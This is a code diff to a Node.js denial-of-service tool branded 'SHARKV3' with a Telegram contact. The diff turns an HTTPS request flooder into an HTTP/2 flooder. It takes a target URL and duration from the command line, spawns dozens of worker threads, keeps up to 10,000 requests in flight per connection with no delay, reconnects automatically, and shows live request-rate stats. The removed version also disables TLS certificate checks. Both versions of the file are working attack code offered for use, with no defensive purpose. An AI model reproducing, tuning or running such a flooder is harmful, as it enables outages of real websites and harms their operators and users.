@@ -1,14 +1,14 @@
-const https = require('https');
+const http2 = require('http2');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
-const url = require('url');
 
-const THREADS = 48;
-const INITIAL_CONNECTIONS = 50;
-const POWER_MULTIPLIER = 5;
-const MAX_INFLIGHT = 4000;
+const THREADS = 32;
+const INITIAL_CONNECTIONS = 45;
+const POWER_MULTIPLIER = 4;
+const MAX_INFLIGHT = 10000;
+const LIVE_REFRESH_RATE = 1100;
 
 let totalRequests = 0;
 let successCount = 0;
@@ -26,9 +26,10 @@ if (isMainThread) {
     const duration = parseInt(process.argv[3]);
 
     console.clear();
-    console.log(`SHARKV3-H1.1 FIXED - T.ME/STSVKINGDOM`);
-    console.log(`Firing full power...`);
+    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+    console.log(`SHARKV3! - NO THREAD WARMUP .exx`);
 
+    
     for (let i = 0; i < THREADS; i++) {
         new Worker(__filename, { workerData: { target, duration, initial: true } });
     }
@@ -37,16 +38,17 @@ if (isMainThread) {
         new Worker(__filename, { workerData: { target, duration, initial: false } });
     }
 
+    // Live Stats
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
         rpsLastSecond = 0;
-    }, 1000);
+    }, LIVE_REFRESH_RATE);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
         readline.clearScreenDown(process.stdout);
-        console.log(`SHARKV3-H1.1 FIXED - T.ME/STSVKINGDOM`);
+        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
         console.log(`total: ${totalRequests}`);
         console.log(`max-r: ${maxRps}`);
@@ -69,64 +71,64 @@ if (isMainThread) {
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
 
-    const parsed = url.parse(target);
-    const hostname = parsed.hostname;
-    const port = parsed.port || 443;
-    const path = parsed.path || '/';
-
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
-    const agent = new https.Agent({
-        keepAlive: true,
-        maxSockets: 5000,
-        maxFreeSockets: 5000
-    });
+    function sendLoop(client, inflight) {
+        if (Date.now() > end || client.destroyed) return;
 
-    function createFlooder() {
-        let inflight = 0;
+        if (inflight.count < MAX_INFLIGHT) {
+            try {
+                inflight.count++;
+                const req = client.request({ ':method': 'GET', ':path': '/' });
 
-        function send() {
-            if (Date.now() > end || inflight >= MAX_INFLIGHT) {
-                return setTimeout(send, 10);
-            }
-
-            inflight++;
-            sendStat('req');
-
-            const req = https.request({
-                hostname,
-                port,
-                path,
-                method: 'GET',
-                agent,
-                headers: {
-                    'User-Agent': 'Mozilla/5.0',
-                    'Connection': 'keep-alive',
-                },
-                rejectUnauthorized: false,
-            }, res => {
-                res.on('data', () => {});
-                res.on('end', () => {
-                    inflight--;
+                req.on('response', () => {
+                    inflight.count--;
                     sendStat('ok');
-                    setImmediate(send);
                 });
-            });
 
-            req.on('error', () => {
-                inflight--;
+                req.on('error', () => {
+                    inflight.count--;
+                    sendStat('err');
+                });
+
+                req.end();
+                sendStat('req');
+            } catch {
+                inflight.count--;
                 sendStat('err');
-                setImmediate(send);
-            });
-
-            req.end();
+            }
         }
 
-        for (let i = 0; i < 100; i++) send();
+        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
+    }
+
+    function createConnection() {
+        if (Date.now() > end) return;
+
+        let client;
+        try {
+            client = http2.connect(target);
+
+            const inflight = { count: 0 };
+
+            client.on('error', () => {
+                client.destroy();
+                setTimeout(createConnection, 100); // auto-recover fast
+            });
+
+            client.on('goaway', () => client.close());
+            client.on('close', () => setTimeout(createConnection, 100));
+
+            client.on('connect', () => {
+                for (let i = 0; i < 150; i++) sendLoop(client, inflight); // boosted request flow
+            });
+        } catch {
+            setTimeout(createConnection, 100);
+        }
     }
 
     for (let i = 0; i < connections; i++) {
-        createFlooder();
+        createConnection();
     }
 }
